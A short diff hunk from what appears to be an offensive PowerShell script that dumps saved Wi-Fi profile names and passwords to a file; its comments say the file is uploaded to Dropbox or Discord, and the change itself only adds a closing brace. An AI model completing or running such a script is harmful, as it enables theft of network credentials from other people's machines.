@@ -85,6 +85,7 @@ Foreach($WLANProfileName in $WLANProfileNames){
 	# This is the name of the file the networks and passwords are saved to and later uploaded to the DropBox Cloud Storage
 
 	echo "`nW-Lan profiles: ===============================" $WLANProfileObjects >> $FileName
+ }
 #--------------------------------------------------------------------------------------------------------------------------------------
 
 # This is to upload your files to discord
